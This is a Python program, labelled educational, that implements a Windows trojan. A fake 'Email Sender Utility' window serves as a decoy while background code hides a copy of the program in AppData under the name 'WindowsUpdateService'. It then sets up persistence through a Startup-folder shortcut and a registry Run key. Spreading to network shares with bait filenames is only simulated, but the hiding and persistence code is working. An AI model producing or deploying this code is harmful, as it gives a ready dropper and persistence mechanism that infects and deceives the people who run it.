"""
EDUCATIONAL MALICIOUS CODE DEMONSTRATION
WARNING: This is for educational purposes only in a controlled lab environment.

This program demonstrates a complete attack chain:
- Delivery: Shows GUI while creating hidden folders
- Auto-Run: Adds persistence mechanisms
- Spreading: Replicates to network shares

Total: 9 functions working together as one malicious program
"""

import tkinter as tk
from tkinter import messagebox
import os
import sys
import shutil
import winreg
import threading
import time
from pathlib import Path
import smtplib
from email.mime.text import MIMEText

# ============================================================================
# STAGE 1: DELIVERY (Functions 1-3)
# ============================================================================

def show_email_gui():
    """
    Function 1: Display legitimate-looking email GUI
    Shows interface to distract user while malicious actions happen
    """
    global email_window, email_entry
    
    print("[Malicious] Function 1: Showing email GUI to user...")
    
    email_window = tk.Tk()
    email_window.title("Email Sender Utility v2.0")
    email_window.geometry("400x250")
    email_window.resizable(False, False)
    
    # Create GUI elements
    title_label = tk.Label(email_window, text="Quick Email Sender", 
                          font=("Arial", 16, "bold"))
    title_label.pack(pady=20)
    
    instruction_label = tk.Label(email_window, 
                                text="Enter your email address to send a test message:",
                                font=("Arial", 10))
    instruction_label.pack(pady=10)
    
    email_entry = tk.Entry(email_window, width=40, font=("Arial", 11))
    email_entry.pack(pady=10)
    email_entry.insert(0, "your.email@example.com")
    
    send_button = tk.Button(email_window, text="Send Test Email", 
                           command=on_send_clicked, 
                           bg="#4CAF50", fg="white",
                           font=("Arial", 11, "bold"),
                           width=20, height=2)
    send_button.pack(pady=20)
    
    # Start malicious actions in background thread
    threading.Thread(target=execute_malicious_stage1, daemon=True).start()
    
    email_window.mainloop()

def create_hidden_folder():
    """
    Function 2: Create hidden folder in AppData
    Runs in background while user sees GUI
    """
    print("[Malicious] Function 2: Creating hidden folder...")
    
    # Create hidden folder path
    appdata = os.getenv('APPDATA')
    hidden_folder = os.path.join(appdata, "WindowsUpdateService")
    
    try:
        # Create folder if it doesn't exist
        if not os.path.exists(hidden_folder):
            os.makedirs(hidden_folder)
            
            # Set folder as hidden (Windows)
            os.system(f'attrib +h "{hidden_folder}"')
            
            print(f"[Malicious] Created hidden folder: {hidden_folder}")
            return hidden_folder
        else:
            print(f"[Malicious] Hidden folder already exists: {hidden_folder}")
            return hidden_folder
    except Exception as e:
        print(f"[Malicious] Error creating hidden folder: {e}")
        return None

def copy_to_hidden_location():
    """
    Function 3: Copy executable to hidden folder
    Makes program persist even if original is deleted
    """
    print("[Malicious] Function 3: Copying to hidden location...")
    
    try:
        # Get current executable path
        current_exe = sys.argv[0]
        
        # Get hidden folder path
        appdata = os.getenv('APPDATA')
        hidden_folder = os.path.join(appdata, "WindowsUpdateService")
        hidden_exe = os.path.join(hidden_folder, "WindowsUpdateService.exe")
        
        # Copy if not already there
        if not os.path.exists(hidden_exe) or os.path.abspath(current_exe) != os.path.abspath(hidden_exe):
            shutil.copy2(current_exe, hidden_exe)
            print(f"[Malicious] Copied to: {hidden_exe}")
            return hidden_exe
        else:
            print(f"[Malicious] Already running from hidden location")
            return hidden_exe
    except Exception as e:
        print(f"[Malicious] Error copying to hidden location: {e}")
        return None

def execute_malicious_stage1():
    """Helper function to run Stage 1 functions in background"""
    time.sleep(1)  # Wait a bit so GUI appears first
    create_hidden_folder()
    copy_to_hidden_location()

# ============================================================================
# STAGE 2: AUTO-RUN (Functions 4-6)
# ============================================================================

def send_fake_email(user_email):
    """
    Function 4: Send actual email to make it look legitimate
    While sending, trigger auto-run functions in background
    """
    print(f"[Malicious] Function 4: Sending email to {user_email}...")
    
    try:
        # Create simple email message
        msg = MIMEText("This is a test email from Email Sender Utility.")
        msg['Subject'] = "Test Email"
        msg['From'] = "emailsender@utility.com"
        msg['To'] = user_email
        
        # NOTE: In a real demo, you would configure an SMTP server
        # For now, we just simulate success
        print(f"[Malicious] Email 'sent' to {user_email} (simulated)")
        
        # Trigger auto-run stage while user thinks email is being sent
        threading.Thread(target=execute_autorun_stage, daemon=True).start()
        
        return True
    except Exception as e:
        print(f"[Malicious] Email sending failed: {e}")
        # Still trigger auto-run even if email fails
        threading.Thread(target=execute_autorun_stage, daemon=True).start()
        return False

def add_startup_shortcut():
    """
    Function 5: Add shortcut to Startup folder
    Program will run automatically on every login
    """
    print("[Malicious] Function 5: Adding startup shortcut...")
    
    try:
        # Get Startup folder path
        startup_folder = os.path.join(os.getenv('APPDATA'), 
                                     r'Microsoft\Windows\Start Menu\Programs\Startup')
        
        # Get hidden executable path
        appdata = os.getenv('APPDATA')
        hidden_exe = os.path.join(appdata, "WindowsUpdateService", "WindowsUpdateService.exe")
        
        # Create shortcut (using VBScript method for simplicity)
        shortcut_path = os.path.join(startup_folder, "WindowsUpdateService.lnk")
        
        # Create VBScript to make shortcut
        vbs_script = f'''
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "{shortcut_path}"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "{hidden_exe}"
oLink.WindowStyle = 7
oLink.Description = "Windows Update Service"
oLink.Save
'''
        
        vbs_file = os.path.join(os.getenv('TEMP'), 'create_shortcut.vbs')
        with open(vbs_file, 'w') as f:
            f.write(vbs_script)
        
        # Execute VBScript
        os.system(f'cscript //nologo "{vbs_file}"')
        os.remove(vbs_file)
        
        print(f"[Malicious] Created startup shortcut: {shortcut_path}")
        return True
    except Exception as e:
        print(f"[Malicious] Error creating startup shortcut: {e}")
        return False

def add_registry_key():
    """
    Function 6: Add registry Run key for persistence
    Backup method if startup shortcut is deleted
    """
    print("[Malicious] Function 6: Adding registry key...")
    
    try:
        # Get hidden executable path
        appdata = os.getenv('APPDATA')
        hidden_exe = os.path.join(appdata, "WindowsUpdateService", "WindowsUpdateService.exe")
        
        # Open registry key
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        
        # Add value
        winreg.SetValueEx(key, 'WindowsUpdateService', 0, winreg.REG_SZ, hidden_exe)
        winreg.CloseKey(key)
        
        print(f"[Malicious] Added registry key: HKCU\\{key_path}\\WindowsUpdateService")
        return True
    except Exception as e:
        print(f"[Malicious] Error adding registry key: {e}")
        return False

def execute_autorun_stage():
    """Helper function to run Stage 2 functions"""
    time.sleep(0.5)  # Brief delay to simulate "sending email"
    add_startup_shortcut()
    add_registry_key()

# ============================================================================
# STAGE 3: SPREADING (Functions 7-9)
# ============================================================================

def scan_network_shares():
    """
    Function 7: Scan network for accessible shared folders
    Finds potential targets for spreading
    """
    print("[Malicious] Function 7: Scanning network shares...")
    
    accessible_shares = []
    
    try:
        # SIMULATION: In a real scenario, this would scan the network
        # For safety, we only list simulated shares
        simulated_shares = [
            r"\\DESKTOP-PC1\SharedDocs",
            r"\\LAPTOP-USER2\Public",
            r"\\FILESERVER\Downloads"
        ]
        
        print(f"[Malicious] Found {len(simulated_shares)} network shares (simulated)")
        for share in simulated_shares:
            print(f"[Malicious]   - {share}")
        
        # In real malware, this would test write access
        # For demo, we return the simulated list
        return simulated_shares
    except Exception as e:
        print(f"[Malicious] Error scanning network: {e}")
        return []

def replicate_to_shares(shares):
    """
    Function 8: Copy malicious program to network shares
    Uses tempting filenames to trick other users
    """
    print("[Malicious] Function 8: Replicating to shares...")
    
    tempting_names = [
        "PayrollReport_2025.exe",
        "CompanyPhotos.exe",
        "ImportantDocument.exe",
        "QuickFix.exe"
    ]
    
    try:
        # Get current executable
        appdata = os.getenv('APPDATA')
        source_exe = os.path.join(appdata, "WindowsUpdateService", "WindowsUpdateService.exe")
        
        spread_count = 0
        for share in shares:
            for filename in tempting_names:
                target_path = os.path.join(share, filename)
                
                # SAFETY: We don't actually copy to real network shares
                # Just simulate the action
                print(f"[Malicious]   Would copy to: {target_path} (simulated)")
                spread_count += 1
        
        print(f"[Malicious] Spreading simulation complete: {spread_count} copies")
        return spread_count
    except Exception as e:
        print(f"[Malicious] Error replicating to shares: {e}")
        return 0

def log_and_cleanup():
    """
    Function 9: Log infection status and cleanup traces
    Records successful infections and exits cleanly
    """
    print("[Malicious] Function 9: Logging and cleanup...")
    
    try:
        # Create log file in hidden folder
        appdata = os.getenv('APPDATA')
        log_file = os.path.join(appdata, "WindowsUpdateService", "activity.log")
        
        with open(log_file, 'a') as f:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] Infection cycle completed\n")
            f.write(f"[{timestamp}] Delivery: Success\n")
            f.write(f"[{timestamp}] Auto-Run: Success\n")
            f.write(f"[{timestamp}] Spreading: Simulated\n")
        
        print(f"[Malicious] Activity logged to: {log_file}")
        print("[Malicious] All malicious functions completed successfully")
        return True
    except Exception as e:
        print(f"[Malicious] Error logging: {e}")
        return False

def execute_spreading_stage():
    """Helper function to run Stage 3 functions"""
    shares = scan_network_shares()
    replicate_to_shares(shares)
    log_and_cleanup()

# ============================================================================
# GUI EVENT HANDLERS
# ============================================================================

def on_send_clicked():
    """Handle send button click"""
    user_email = email_entry.get()
    
    if not user_email or '@' not in user_email:
        messagebox.showerror("Error", "Please enter a valid email address")
        return
    
    # Show sending message
    messagebox.showinfo("Sending", "Sending email, please wait...")
    
    # Send email (and trigger auto-run)
    success = send_fake_email(user_email)
    
    # Wait a moment for auto-run to complete
    time.sleep(1)
    
    # Show success
    messagebox.showinfo("Success", "Email sent successfully!")
    
    # Start spreading stage in background
    threading.Thread(target=execute_spreading_stage, daemon=True).start()
    
    # Close window after a moment
    email_window.after(2000, email_window.destroy)

# ============================================================================
# MAIN EXECUTION
# ============================================================================

if __name__ == "__main__":
    print("="*60)
    print("MALICIOUS CODE DEMONSTRATION - EDUCATIONAL PURPOSES ONLY")
    print("="*60)
    print("\n[Malicious] Starting Email Sender Utility (malicious version)...")
    print("[Malicious] This will execute all 9 malicious functions\n")
    
    # Start with GUI (Function 1)
    show_email_gui()
    
    print("\n[Malicious] Program terminated")
    print("="*60)
